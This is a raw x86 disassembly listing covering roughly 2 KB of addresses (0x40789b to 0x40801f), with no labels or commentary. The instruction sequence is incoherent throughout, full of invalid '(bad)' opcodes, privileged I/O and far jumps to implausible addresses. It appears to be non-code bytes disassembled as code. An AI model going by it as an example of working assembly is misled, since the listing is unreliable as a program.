  40789b:	js     0x407904
  40789d:	aas    
  40789e:	mov    dh,0xb5
  4078a0:	imul   ebx,DWORD PTR [eax-0x49],0x41
  4078a4:	sub    DWORD PTR [esi-0x3270b118],edi
  4078aa:	inc    esp
  4078ab:	pop    edi
  4078ac:	popa   
  4078ad:	cmp    ch,BYTE PTR [ebp-0x52]
  4078b0:	sbb    ch,BYTE PTR [edi]
  4078b2:	test   BYTE PTR [eax+0x0],0x64
  4078b6:	nop
  4078b7:	jmp    0x40792a
  4078b9:	push   es
  4078ba:	push   ebx
  4078bb:	dec    esi
  4078bc:	and    DWORD PTR [ebx],eax
  4078be:	das    
  4078bf:	cwde   
  4078c0:	shl    DWORD PTR ds:0x32424155,cl
  4078c6:	mov    eax,0x74d70bb8
  4078cb:	mov    ah,0x31
  4078cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078ce:	or     bh,dh
  4078d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078d1:	or     DWORD PTR [eax],ebx
  4078d3:	lods   eax,DWORD PTR ds:[esi]
  4078d4:	icebp  
  4078d5:	ja     0x407867
  4078d7:	inc    DWORD PTR [ebp+eiz*2+0x78c19bef]
  4078de:	jmp    0x825db7f1
  4078e3:	aaa    
  4078e4:	stc    
  4078e5:	jnp    0x40788e
  4078e7:	jmp    0xeb17:0x34d5bcbb
  4078ee:	jg     0x40788c
  4078f0:	pop    esp
  4078f1:	mov    eax,ds:0x97625106
  4078f6:	lock repz test DWORD PTR [ebp-0x11],edi
  4078fb:	pop    ecx
  4078fc:	jp     0x4078b8
  4078fe:	in     eax,0xd2
  407900:	add    ch,ch
  407902:	test   eax,0xef7c7f61
  407907:	xchg   edx,eax
  407908:	and    esp,eax
  40790a:	gs push cs
  40790c:	fistp  DWORD PTR [eiz*4+0x6d6d9bb3]
  407913:	(bad)  
  407914:	retf   
  407915:	mov    eax,0x1c167ffb
  40791a:	iret   
  40791b:	cld    
  40791c:	pop    ss
  40791d:	jp     0x4078d3
  40791f:	mov    DWORD PTR [ecx],0x45708050
  407925:	loop   0x40794f
  407927:	mov    al,0x96
  407929:	xchg   edx,edi
  40792b:	dec    esi
  40792c:	aad    0xcf
  40792e:	mov    edi,0xa79c1df0
  407933:	fisubr DWORD PTR [eax-0x19]
  407936:	lds    ebx,FWORD PTR [ecx+0x704da65d]
  40793c:	dec    edx
  40793d:	mov    ah,0xe8
  40793f:	call   0x8dd2:0xd6c49fe6
  407946:	mov    ebp,0x13833ada
  40794b:	sti    
  40794c:	pop    esi
  40794d:	sahf   
  40794e:	or     DWORD PTR [ebx+0x4b],0x618081a7
  407955:	pop    ecx
  407956:	add    ah,BYTE PTR [ebx+ecx*4-0x18]
  40795a:	in     al,0xd6
  40795c:	mov    bl,0x3
  40795e:	or     eax,0x637453b6
  407963:	popa   
  407964:	and    BYTE PTR [edx-0x69],bh
  407967:	stc    
  407968:	pop    eax
  407969:	popf   
  40796a:	je     0x40791f
  40796c:	sahf   
  40796d:	cmp    BYTE PTR [ebx+eiz*2],cl
  407970:	push   ds
  407971:	pop    eax
  407972:	iret   
  407973:	outs   dx,BYTE PTR ss:[esi]
  407975:	xchg   ecx,eax
  407976:	or     eax,0x3a1110e4
  40797b:	stos   DWORD PTR es:[edi],eax
  40797c:	mov    al,0x8c
  40797e:	mov    cl,0xef
  407980:	xor    cl,BYTE PTR [edx]
  407982:	sbb    ebx,DWORD PTR [edx]
  407984:	popa   
  407985:	retf   0x1aa2
  407988:	push   ecx
  407989:	inc    esi
  40798a:	jge    0x4079ae
  40798c:	add    eax,0x36de46a9
  407991:	jle    0x40796c
  407993:	daa    
  407994:	cmp    esp,DWORD PTR [edx+0x660d1022]
  40799a:	add    edi,edx
  40799c:	call   0x656d06b0
  4079a1:	cwde   
  4079a2:	sub    BYTE PTR [edx+0x33],al
  4079a5:	pop    ds
  4079a6:	(bad)  
  4079a7:	call   0xf4c2c87a
  4079ac:	xchg   edx,eax
  4079ad:	daa    
  4079ae:	sub    esp,DWORD PTR [edx+eax*4-0x65]
  4079b2:	fild   QWORD PTR ds:0x5f790473
  4079b8:	repz add al,0x90
  4079bb:	and    BYTE PTR [eax-0x2a572389],dl
  4079c1:	mov    ebp,0x187223a5
  4079c6:	and    BYTE PTR [ebx],bh
  4079c8:	mov    cl,0x2a
  4079ca:	xlat   BYTE PTR ds:[ebx]
  4079cb:	adc    DWORD PTR [eax-0x4],0xffffffab
  4079cf:	scas   al,BYTE PTR es:[edi]
  4079d0:	out    dx,al
  4079d1:	inc    eax
  4079d2:	and    edx,ebp
  4079d4:	jns    0x407a45
  4079d6:	push   ds
  4079d7:	sub    BYTE PTR [ebp+0x72],al
  4079da:	or     DWORD PTR [ecx-0x30e82736],0xffffffce
  4079e1:	mov    eax,0x4a8c94b
  4079e6:	add    edi,ecx
  4079e8:	and    BYTE PTR [eax+0x22],ch
  4079eb:	add    esi,DWORD PTR [edx-0x6875abfb]
  4079f1:	call   0xf7b4:0xf9e6e3af
  4079f8:	push   cs
  4079f9:	sub    BYTE PTR [edi+0x7f],bl
  4079fc:	pop    ss
  4079fd:	inc    esi
  4079fe:	push   cs
  4079ff:	scas   eax,DWORD PTR es:[edi]
  407a00:	dec    ebp
  407a01:	inc    esp
  407a02:	and    eax,0xedbadf7c
  407a07:	outs   dx,DWORD PTR ds:[esi]
  407a08:	(bad)  
  407a09:	out    dx,al
  407a0a:	pop    esi
  407a0b:	sub    BYTE PTR [ecx],ch
  407a0d:	js     0x4079d1
  407a0f:	lahf   
  407a10:	icebp  
  407a11:	(bad)  
  407a12:	fcom   DWORD PTR [esi+0x7e]
  407a15:	es inc eax
  407a17:	dec    esp
  407a18:	test   DWORD PTR [edi],edi
  407a1a:	xor    eax,0x9d35352f
  407a1f:	or     BYTE PTR [ebx+edx*4+0x19],bh
  407a23:	push   cs
  407a24:	lods   al,BYTE PTR ds:[esi]
  407a25:	mov    al,ds:0x72c9fddd
  407a2a:	shr    DWORD PTR [edx],1
  407a2c:	cli    
  407a2d:	aam    0x71
  407a2f:	xchg   esp,eax
  407a30:	fdivr  st(0),st
  407a32:	in     al,0xea
  407a34:	std    
  407a35:	pop    ebp
  407a36:	aas    
  407a37:	nop
  407a38:	sbb    BYTE PTR [ecx+eiz*8-0x68f6fcaa],cl
  407a3f:	ja     0x4079d3
  407a41:	in     eax,dx
  407a42:	and    eax,0xa1090fb8
  407a47:	cmp    al,bh
  407a49:	mov    ah,0x89
  407a4b:	jle    0x407a8b
  407a4d:	cmp    cl,cl
  407a4f:	xor    ebp,ebx
  407a51:	push   0x99d2a0e2
  407a56:	xchg   edx,eax
  407a57:	in     al,dx
  407a58:	dec    ecx
  407a59:	add    BYTE PTR [ebx+0x6b],dh
  407a5c:	cwde   
  407a5d:	ins    BYTE PTR es:[edi],dx
  407a5e:	int    0x3
  407a60:	pop    ds
  407a61:	sub    BYTE PTR [esi],ch
  407a63:	in     al,dx
  407a64:	retf   
  407a65:	dec    eax
  407a66:	xlat   BYTE PTR ds:[ebx]
  407a67:	sbb    bh,BYTE PTR [eax+0x491a4cbd]
  407a6d:	dec    edx
  407a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a6f:	inc    edx
  407a70:	xchg   ebp,eax
  407a71:	jle    0x407a71
  407a73:	into   
  407a74:	mov    ecx,0x654df540
  407a79:	dec    edx
  407a7a:	out    dx,eax
  407a7b:	dec    esi
  407a7c:	pop    esp
  407a7d:	bsf    ecx,DWORD PTR [edi+0x3]
  407a81:	push   edx
  407a82:	jne    0x407af3
  407a84:	or     dl,BYTE PTR [eax]
  407a86:	push   eax
  407a87:	add    BYTE PTR gs:[ebx],ah
  407a8a:	push   esp
  407a8b:	lods   al,BYTE PTR ds:[esi]
  407a8c:	das    
  407a8d:	sbb    eax,0xe405b354
  407a92:	test   eax,0x9b85b2f7
  407a97:	sbb    ah,BYTE PTR [ebx+0x50]
  407a9a:	adc    dh,BYTE PTR [ebx]
  407a9c:	cld    
  407a9d:	xchg   DWORD PTR [ecx-0x6b],eax
  407aa0:	retf   
  407aa1:	fst    DWORD PTR [ecx+0x2]
  407aa4:	enter  0x37a9,0x75
  407aa8:	sub    BYTE PTR [esi],ah
  407aaa:	test   BYTE PTR [ebp-0x12],0x23
  407aae:	out    dx,eax
  407aaf:	jae    0x407ada
  407ab1:	sbb    ebp,edx
  407ab3:	daa    
  407ab4:	aad    0x3b
  407ab6:	add    DWORD PTR [eax],ebp
  407ab8:	and    dh,BYTE PTR [edi]
  407aba:	push   0x26bc1599
  407abf:	in     al,0x2
  407ac1:	into   
  407ac2:	adc    eax,DWORD PTR ss:[edx+eax*2+0x25]
  407ac7:	call   0xb796e6c0
  407acc:	and    al,0x56
  407ace:	sub    ebx,ebx
  407ad0:	arpl   WORD PTR [edi-0x50],sp
  407ad3:	test   BYTE PTR [eax+0x74],dl
  407ad6:	pushf  
  407ad7:	lds    edi,FWORD PTR [edx+0x2761c31e]
  407add:	push   esi
  407ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407adf:	nop
  407ae0:	jle    0x407b5b
  407ae2:	out    dx,al
  407ae3:	call   0xa44:0x98286470
  407aea:	addr16 cmp al,0xda
  407aed:	pusha  
  407aee:	adc    cl,ah
  407af0:	cmp    cl,dl
  407af2:	icebp  
  407af3:	imul   ecx,DWORD PTR [edi+0x15],0x7ac09dcc
  407afa:	leave  
  407afb:	mov    edi,0xe536023d
  407b00:	loopne 0x407b1a
  407b02:	or     ecx,DWORD PTR [edx]
  407b04:	cmp    DWORD PTR [eax+0x66],eax
  407b07:	(bad)  
  407b08:	sahf   
  407b09:	int3   
  407b0a:	sbb    al,0xe
  407b0c:	(bad)  
  407b0d:	mov    cl,al
  407b0f:	sti    
  407b10:	xor    DWORD PTR [edi-0x17],ecx
  407b13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b14:	inc    esi
  407b15:	jmp    0x972935c9
  407b1a:	pop    es
  407b1b:	jb     0x407b2a
  407b1d:	fwait
  407b1e:	push   cs
  407b1f:	retf   
  407b20:	mov    dh,0x5d
  407b22:	pop    esp
  407b23:	mov    WORD PTR [edi+0x4f],ss
  407b26:	ds retf 0x6a1d
  407b2a:	rol    ch,0x7b
  407b2d:	adc    ebp,DWORD PTR [ecx+0x64]
  407b30:	stc    
  407b31:	mov    eax,0xa6be4b3f
  407b36:	xor    BYTE PTR [eax-0x793fcbf3],ah
  407b3c:	repnz in al,0x31
  407b3f:	fcomp  DWORD PTR [esi]
  407b41:	imul   al
  407b43:	inc    edx
  407b44:	fdivr  DWORD PTR [eax-0x54]
  407b47:	pop    eax
  407b48:	xor    esp,DWORD PTR [ecx+0x71de1c3]
  407b4e:	fld    DWORD PTR cs:[eax]
  407b51:	hlt    
  407b52:	daa    
  407b53:	aad    0x3e
  407b55:	cmp    eax,0x8899fa9b
  407b5b:	test   eax,eax
  407b5d:	inc    ecx
  407b5e:	lock mov bh,0x80
  407b61:	add    al,0x19
  407b63:	pop    ecx
  407b64:	imul   eax,DWORD PTR [edi-0x51],0xfffffff5
  407b68:	test   al,0x47
  407b6a:	xlat   BYTE PTR ds:[ebx]
  407b6b:	pop    esi
  407b6c:	(bad)  
  407b6e:	adc    DWORD PTR [esi+0x445c2e9a],0xd
  407b75:	sbb    DWORD PTR [eax],ecx
  407b77:	ins    BYTE PTR es:[edi],dx
  407b78:	pop    ds
  407b79:	dec    esi
  407b7a:	outs   dx,BYTE PTR ds:[esi]
  407b7b:	dec    edi
  407b7c:	aas    
  407b7d:	sbb    DWORD PTR [ecx],0x55
  407b80:	call   0xb2062420
  407b85:	cmp    eax,0x65964e07
  407b8a:	push   edx
  407b8b:	imul   eax,edx,0x39
  407b8e:	jecxz  0x407b7a
  407b90:	jle    0x407bbc
  407b92:	push   ss
  407b93:	mov    BYTE PTR [edx],al
  407b95:	mov    eax,0x3ed6c649
  407b9a:	(bad)  
  407b9b:	sti    
  407b9c:	push   ss
  407b9d:	dec    ecx
  407b9e:	push   edi
  407b9f:	mov    dh,0x23
  407ba1:	push   edx
  407ba2:	mov    bh,0x3b
  407ba4:	mov    ebp,0x2fb16c98
  407baa:	sub    al,0x4c
  407bac:	out    dx,al
  407bad:	sahf   
  407bae:	dec    ecx
  407baf:	xor    dl,BYTE PTR [eax+0x138d9514]
  407bb5:	retf   0x594b
  407bb8:	jmp    0x407b43
  407bba:	xor    BYTE PTR [esp+edx*4],al
  407bbd:	pusha  
  407bbe:	mov    ds:0x1414d5f0,eax
  407bc3:	mov    al,0xf
  407bc5:	ficomp WORD PTR [esi]
  407bc7:	cmp    al,0x1a
  407bc9:	fadd   QWORD PTR [ebx-0x4f4889f2]
  407bcf:	cmp    al,dl
  407bd1:	add    ah,BYTE PTR [esi-0x7b2f8931]
  407bd7:	inc    edi
  407bd8:	push   cs
  407bd9:	iret   
  407bda:	or     BYTE PTR [ebx],bl
  407bdc:	stos   BYTE PTR es:[edi],al
  407bdd:	mov    esp,DWORD PTR [ebx]
  407bdf:	cmp    eax,0x6164e833
  407be4:	cmp    al,0xe1
  407be6:	xchg   ecx,eax
  407be7:	pusha  
  407be8:	icebp  
  407be9:	push   ebp
  407bea:	push   ss
  407beb:	pop    ds
  407bec:	and    DWORD PTR [ebx-0x28a1b636],esp
  407bf2:	mov    dl,0x47
  407bf4:	xchg   ebp,eax
  407bf5:	mov    ch,0x63
  407bf7:	push   esi
  407bf8:	xor    al,0xe1
  407bfa:	loope  0x407c28
  407bfc:	jmp    0x6f4fa0da
  407c01:	adc    ch,BYTE PTR [edi+0x3d]
  407c04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c05:	in     eax,0x2b
  407c07:	rcr    ah,1
  407c09:	sub    ah,BYTE PTR [ebx]
  407c0b:	inc    ecx
  407c0c:	neg    BYTE PTR [ebx-0x1c]
  407c0f:	xchg   ecx,ecx
  407c11:	dec    edi
  407c12:	js     0x407be4
  407c14:	repz push edx
  407c16:	std    
  407c17:	outs   dx,BYTE PTR ds:[esi]
  407c18:	push   ecx
  407c19:	mov    edx,0x381c8418
  407c1e:	out    dx,al
  407c1f:	ss nop
  407c21:	inc    eax
  407c22:	xchg   esp,eax
  407c23:	or     eax,0x91d60ba2
  407c28:	call   0x21bf:0x26959826
  407c2f:	dec    esp
  407c30:	dec    edi
  407c31:	pop    DWORD PTR [edx+0x4b]
  407c34:	pop    ecx
  407c35:	ins    DWORD PTR es:[edi],dx
  407c36:	test   edi,edx
  407c38:	ret    0x858b
  407c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c3c:	mov    al,ds:0x36e41a88
  407c41:	das    
  407c42:	lods   eax,DWORD PTR ds:[esi]
  407c43:	aam    0x2
  407c45:	jne    0x407cb0
  407c47:	fst    QWORD PTR [eax+esi*2-0x53]
  407c4b:	gs pop eax
  407c4d:	jne    0x407bf9
  407c4f:	in     eax,dx
  407c50:	inc    edx
  407c51:	out    0xe2,eax
  407c53:	inc    ebx
  407c54:	or     DWORD PTR [ebx],ebx
  407c56:	loope  0x407c8a
  407c58:	test   BYTE PTR [edx+0x7e],dh
  407c5b:	imul   esp,DWORD PTR [eax+esi*2+0x1a],0xe57bdb55
  407c63:	mov    fs,WORD PTR [edx-0x7275ad34]
  407c69:	jbe    0x407caa
  407c6b:	push   eax
  407c6c:	dec    ecx
  407c6d:	or     dh,BYTE PTR [esi+0x48]
  407c70:	or     al,0x1b
  407c72:	(bad)  [edi]
  407c74:	or     al,0xf5
  407c76:	dec    ebp
  407c77:	in     eax,0x70
  407c79:	outs   dx,DWORD PTR ds:[esi]
  407c7a:	and    DWORD PTR [eax+0x6c],eax
  407c7d:	mov    eax,0x82e7c74e
  407c82:	dec    ebx
  407c83:	sbb    al,0x54
  407c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c86:	aad    0x22
  407c88:	pop    esp
  407c89:	iret   
  407c8a:	rcr    BYTE PTR [edx+0x1f],0xe5
  407c8e:	dec    ecx
  407c8f:	push   ebx
  407c90:	mov    esi,eax
  407c92:	adc    edi,ebp
  407c94:	cmp    eax,0x7334b3ad
  407c99:	cmp    BYTE PTR [si+0x6e],bl
  407c9d:	cmp    dh,cl
  407c9f:	pop    dx
  407ca1:	mov    bh,0x2e
  407ca3:	dec    esp
  407ca4:	addr16 pop ebx
  407ca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ca7:	push   edx
  407ca8:	fiadd  DWORD PTR [ecx]
  407caa:	jle    0x407cd1
  407cac:	push   esp
  407cad:	sbb    dh,BYTE PTR [edx+0x9]
  407cb0:	sub    DWORD PTR [ecx+esi*8-0x6e],eax
  407cb4:	xchg   esi,eax
  407cb5:	pop    esi
  407cb6:	retf   
  407cb7:	adc    eax,0xffdbd5e9
  407cbc:	xor    DWORD PTR [ecx-0x46],eax
  407cbf:	push   es
  407cc0:	add    BYTE PTR [edi+0x4b9ae26f],ch
  407cc6:	mov    ch,BYTE PTR [ecx+0x18daa920]
  407ccc:	dec    esi
  407ccd:	scas   al,BYTE PTR es:[edi]
  407cce:	loopne 0x407cdd
  407cd0:	adc    bh,0xa3
  407cd3:	popa   
  407cd4:	js     0x407cb2
  407cd6:	xchg   edi,eax
  407cd7:	add    dl,BYTE PTR [esp+ebp*8-0x641a53d8]
  407cde:	push   0x9ebace9e
  407ce3:	sub    eax,0x732da52f
  407ce8:	mov    ds:0x7ea81c9e,al
  407ced:	arpl   ax,di
  407cef:	pop    ds
  407cf0:	sub    DWORD PTR [edi],0xd1e67c3b
  407cf6:	ss daa 
  407cf8:	cmp    DWORD PTR [esi],ebx
  407cfa:	int    0x9
  407cfc:	xor    ebp,DWORD PTR [bx+di-0x2e]
  407d00:	jb     0x407d6c
  407d02:	lahf   
  407d03:	mov    ds:0x11e8dc56,eax
  407d08:	jnp    0x407d3e
  407d0a:	fcmovnb st,st(2)
  407d0c:	ss icebp 
  407d0e:	push   esp
  407d0f:	fs (bad) 
  407d11:	out    0xc0,eax
  407d13:	push   0x51
  407d15:	push   ebx
  407d16:	div    edi
  407d18:	fldcw  WORD PTR [edx]
  407d1a:	(bad)  
  407d1b:	mov    DWORD PTR [edx],ebp
  407d1d:	xchg   ebx,eax
  407d1e:	push   edi
  407d1f:	dec    esi
  407d20:	and    eax,0x897cdf56
  407d25:	mov    bh,0xf5
  407d27:	mov    al,ds:0xb9795da0
  407d2c:	sbb    eax,0xf990444c
  407d31:	or     esp,ebx
  407d33:	arpl   WORD PTR [edi+0x10],sp
  407d36:	jns    0x407cba
  407d38:	rdtsc  
  407d3a:	loop   0x407d98
  407d3c:	outs   dx,BYTE PTR ds:[esi]
  407d3d:	sub    eax,0xe8f2c956
  407d42:	out    dx,al
  407d43:	mov    bh,0x7
  407d45:	cli    
  407d46:	stos   BYTE PTR es:[edi],al
  407d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d48:	push   edx
  407d49:	out    0xe3,eax
  407d4b:	mov    ch,0xc2
  407d4d:	mov    dh,0x7b
  407d4f:	in     al,0x40
  407d51:	mov    ecx,0x4baa02f4
  407d56:	lock mov al,0xc8
  407d59:	fs test eax,0x89ef43e0
  407d5f:	push   esi
  407d60:	scas   eax,DWORD PTR es:[edi]
  407d61:	aas    
  407d62:	dec    edx
  407d63:	or     BYTE PTR [ebx-0x7c],al
  407d66:	adc    DWORD PTR [ebx+0x7e83e540],ecx
  407d6c:	lods   eax,DWORD PTR ds:[esi]
  407d6d:	scas   eax,DWORD PTR es:[edi]
  407d6e:	iret   
  407d6f:	addr16 (bad) 
  407d71:	aas    
  407d72:	enter  0xd511,0xad
  407d76:	sub    BYTE PTR [esi],ah
  407d78:	jmp    0xbf7e40be
  407d7d:	into   
  407d7e:	je     0x407d16
  407d80:	adc    eax,0x21c682dc
  407d85:	dec    eax
  407d86:	ja     0x407d5b
  407d88:	sub    DWORD PTR [eax-0x2e],esp
  407d8b:	pop    ds
  407d8c:	cdq    
  407d8d:	mov    ebp,0x4c598074
  407d92:	pop    edx
  407d93:	shl    DWORD PTR [esi],0x6
  407d96:	lods   al,BYTE PTR ds:[esi]
  407d97:	dec    esi
  407d98:	repnz outs dx,DWORD PTR ds:[esi]
  407d9a:	sar    edx,0x96
  407d9d:	xchg   edi,eax
  407d9e:	xor    DWORD PTR [edi+edi*1+0x5c8c177],eax
  407da5:	cdq    
  407da6:	rcr    DWORD PTR [esi+0x8139819],cl
  407dac:	sbb    bh,al
  407dae:	and    al,0x60
  407db0:	sbb    BYTE PTR [esi-0x1dc5572e],dl
  407db6:	and    bl,BYTE PTR ds:[ecx-0x5152fdb]
  407dbd:	sub    eax,0xff7055e9
  407dc2:	ror    DWORD PTR [ebx+0x1a3e6d0f],cl
  407dc8:	sbb    edx,0x53
  407dcb:	fstp   QWORD PTR [ebx-0xdc00d6c]
  407dd1:	pop    ds
  407dd2:	mov    ecx,0xb9428ce9
  407dd7:	xchg   esp,eax
  407dd8:	sub    edx,ebp
  407dda:	idiv   ch
  407ddc:	sbb    eax,0xf5b28f7
  407de1:	je     0x407d80
  407de3:	adc    eax,0x6b1bfc3a
  407de8:	in     eax,0x25
  407dea:	cmp    esi,esp
  407dec:	push   edx
  407ded:	dec    esp
  407dee:	iret   
  407def:	ja     0x407e66
  407df1:	xchg   esp,ebx
  407df3:	mov    ebx,0x631f93a
  407df8:	call   0x1b25a84a
  407dfd:	mov    edx,0x9deaf829
  407e02:	rcl    ebp,1
  407e04:	clc    
  407e05:	je     0x407d98
  407e07:	sti    
  407e08:	sub    BYTE PTR [eax+eiz*1+0x31e429a0],ah
  407e0f:	mov    fs:0xb85d1968,eax
  407e15:	mov    ecx,0x5d545bd8
  407e1a:	pop    ebp
  407e1b:	sub    ch,al
  407e1d:	fwait
  407e1e:	(bad)  
  407e1f:	hlt    
  407e20:	lds    ebp,FWORD PTR [edx]
  407e22:	mov    eax,ds:0xa4cb3df5
  407e27:	std    
  407e28:	jns    0x407e71
  407e2a:	aam    0xca
  407e2c:	lock imul edi,DWORD PTR [eax+edi*8+0x3b],0x15
  407e32:	jb     0x407e63
  407e34:	idiv   DWORD PTR [ebx]
  407e36:	lds    esi,FWORD PTR [edx]
  407e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e39:	inc    ebp
  407e3a:	ds xchg al,ch
  407e3d:	lods   eax,DWORD PTR ds:[esi]
  407e3e:	lea    ebx,[eax]
  407e40:	imul   eax,DWORD PTR [ecx+0x62e611d5],0xd
  407e47:	pop    es
  407e48:	xchg   BYTE PTR [ecx+0x6b8b59d0],ah
  407e4e:	les    ecx,FWORD PTR [edx]
  407e50:	jl     0x407e3b
  407e52:	out    dx,al
  407e53:	xchg   edx,eax
  407e54:	push   edi
  407e55:	into   
  407e56:	push   esp
  407e57:	std    
  407e58:	xchg   ecx,eax
  407e59:	loop   0x407e09
  407e5b:	dec    ebx
  407e5c:	mov    dh,0xff
  407e5e:	in     al,dx
  407e5f:	sub    ebx,DWORD PTR [ebx-0x7d]
  407e62:	cld    
  407e63:	xchg   BYTE PTR [ecx],ch
  407e65:	mov    eax,0x3d06ffba
  407e6a:	xchg   DWORD PTR ds:0x439ceca4,ebp
  407e70:	dec    ebp
  407e71:	ret    0x3303
  407e74:	pop    ss
  407e75:	(bad)  
  407e76:	loop   0x407eb5
  407e78:	push   edi
  407e79:	loope  0x407e14
  407e7b:	inc    esi
  407e7c:	int    0x71
  407e7e:	pop    ecx
  407e7f:	push   cs
  407e80:	popf   
  407e81:	test   DWORD PTR [esi+0x62],esp
  407e84:	cmp    al,0xb6
  407e86:	iret   
  407e87:	inc    esp
  407e88:	inc    ebx
  407e89:	jae    0x407e46
  407e8b:	mov    cl,0x7e
  407e8d:	loop   0x407ec9
  407e8f:	call   0x17ac606f
  407e94:	sti    
  407e95:	mov    dh,0x5c
  407e97:	add    esi,ebp
  407e99:	adc    al,0xa4
  407e9b:	jmp    0x82a98f67
  407ea0:	jbe    0x407ee3
  407ea2:	pusha  
  407ea3:	cmp    eax,0x36af7bd8
  407ea8:	(bad)  
  407eaa:	fist   DWORD PTR [edx+0x48]
  407ead:	in     al,0x5d
  407eaf:	popf   
  407eb0:	out    dx,al
  407eb1:	sbb    edi,DWORD PTR [edx+0x2d]
  407eb4:	ins    BYTE PTR es:[edi],dx
  407eb5:	inc    edi
  407eb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb7:	shl    edi,0x0
  407eba:	mov    eax,ds:0xc3091e76
  407ebf:	mov    ebx,0x43bdf2f0
  407ec4:	push   es
  407ec5:	add    DWORD PTR [esp+edi*1],edi
  407ec8:	call   0xd1bed467
  407ecd:	cs pop eax
  407ecf:	mov    dl,0x72
  407ed1:	xor    ch,dh
  407ed3:	outs   dx,DWORD PTR ds:[esi]
  407ed4:	(bad)  
  407ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ed6:	push   0xffffffde
  407ed8:	dec    ebx
  407ed9:	or     edx,DWORD PTR [eax]
  407edb:	jle    0x407ed5
  407edd:	ret    
  407ede:	xor    al,0x8d
  407ee0:	dec    DWORD PTR [ebp-0x32bede30]
  407ee6:	ja     0x407f19
  407ee8:	test   BYTE PTR [ecx],ch
  407eea:	sub    BYTE PTR [edi-0x1727dfa4],dl
  407ef0:	lea    eax,[ebp+0x983de27]
  407ef6:	retf   0xf95
  407ef9:	xor    eax,ebx
  407efb:	loopne 0x407eba
  407efd:	add    cl,BYTE PTR [ebx+0x52f320d9]
  407f03:	and    eax,0x39f9b3a5
  407f08:	jg     0x407f15
  407f0a:	cs pushf 
  407f0c:	sub    ah,BYTE PTR [ecx-0x32cc1f20]
  407f12:	rcr    BYTE PTR [edi+eiz*8-0x80],0x57
  407f17:	adc    BYTE PTR [ebp-0x161d8e03],ch
  407f1d:	scas   eax,DWORD PTR es:[edi]
  407f1e:	mov    ds:0xf621df80,al
  407f23:	in     eax,0x10
  407f25:	add    al,0x7f
  407f27:	sub    BYTE PTR [edx],cl
  407f29:	cmp    al,0xde
  407f2b:	push   eax
  407f2c:	not    DWORD PTR [ebp+0x71]
  407f2f:	push   ds
  407f30:	mov    ds,edi
  407f32:	or     eax,0xfa569e11
  407f37:	mov    ecx,0xc9167c2b
  407f3c:	call   FWORD PTR [ebx]
  407f3e:	test   al,0x8d
  407f40:	dec    BYTE PTR [esi-0x7ecfd17a]
  407f46:	stos   BYTE PTR es:[edi],al
  407f47:	outs   dx,DWORD PTR ds:[esi]
  407f48:	jp     0x407f7e
  407f4a:	test   eax,0x991caba8
  407f4f:	mov    esp,0x61c2004e
  407f54:	adc    al,0xff
  407f56:	stc    
  407f57:	fincstp 
  407f59:	mov    ds:0x388eafb1,al
  407f5e:	inc    eax
  407f5f:	and    bh,BYTE PTR [eax+eax*1]
  407f62:	jge    0x407f90
  407f64:	retf   0x2c2f
  407f67:	idiv   ah
  407f69:	outs   dx,DWORD PTR ds:[esi]
  407f6a:	and    bh,0x13
  407f6d:	sbb    ah,BYTE PTR [eax+0x26]
  407f70:	pop    esi
  407f71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f72:	mov    BYTE PTR [ecx],ah
  407f74:	jp     0x407f04
  407f76:	mov    bh,0xb0
  407f78:	mov    edi,0xfee3fa1b
  407f7d:	pop    ds
  407f7e:	add    edi,DWORD PTR [ecx-0x699dda77]
  407f84:	dec    edx
  407f85:	adc    al,0x79
  407f87:	jp     0x407ff0
  407f89:	add    bl,BYTE PTR gs:[ebx-0x22]
  407f8d:	dec    eax
  407f8e:	or     al,0x44
  407f90:	fcomi  st,st(0)
  407f92:	xor    DWORD PTR [ecx+ebx*2],ecx
  407f95:	pop    ecx
  407f96:	lods   al,BYTE PTR ds:[esi]
  407f97:	lea    ebx,[ebp-0x61890427]
  407f9d:	in     eax,dx
  407f9e:	inc    ebp
  407f9f:	jmp    0xd461:0x1c17613d
  407fa6:	es xor al,0x78
  407fa9:	lock add al,0xb5
  407fac:	mov    BYTE PTR [ebx],bl
  407fae:	aad    0xa1
  407fb0:	(bad)  [esi-0x5e]
  407fb3:	popf   
  407fb4:	not    BYTE PTR ds:0x2cf63607
  407fba:	ja     0x407fb9
  407fbc:	stos   BYTE PTR es:[edi],al
  407fbd:	into   
  407fbe:	or     bh,BYTE PTR [eax+0xdda2ef3]
  407fc4:	pop    ebx
  407fc5:	mov    ebp,0x2855e02b
  407fca:	(bad)  
  407fcb:	rcr    BYTE PTR [edx+0x29],1
  407fce:	lds    ecx,FWORD PTR [edx+0x3d]
  407fd1:	nop
  407fd2:	test   DWORD PTR [edx-0x70071479],ebp
  407fd8:	mov    ecx,0xff7824a3
  407fdd:	iret   
  407fde:	repz repnz loop 0x408026
  407fe2:	push   ebx
  407fe3:	shld   DWORD PTR [edx+0x57cd20b6],esp,cl
  407fea:	jl     0x407fe9
  407fec:	cmp    eax,0xa737ff3f
  407ff1:	cs fst st(1)
  407ff4:	(bad)  
  407ff5:	out    0xc3,al
  407ff7:	jns    0x407fa5
  407ff9:	push   es
  407ffa:	pop    edi
  407ffb:	jns    0x408033
  407ffd:	les    ebp,FWORD PTR [edx]
  407fff:	sti    
  408000:	adc    al,0xb8
  408002:	dec    esi
  408003:	mov    ecx,0x797a764d
  408008:	mov    dh,0x10
  40800a:	std    
  40800b:	aas    
  40800c:	ret    
  40800d:	std    
  40800e:	sub    dh,BYTE PTR ds:0x350abb99
  408014:	xor    al,0x70
  408016:	and    al,0x3d
  408018:	or     edx,esi
  40801a:	add    edx,DWORD PTR [eax-0x35]
  40801d:	popf   
  40801e:	(bad)  
  40801f:	je     0x40802e
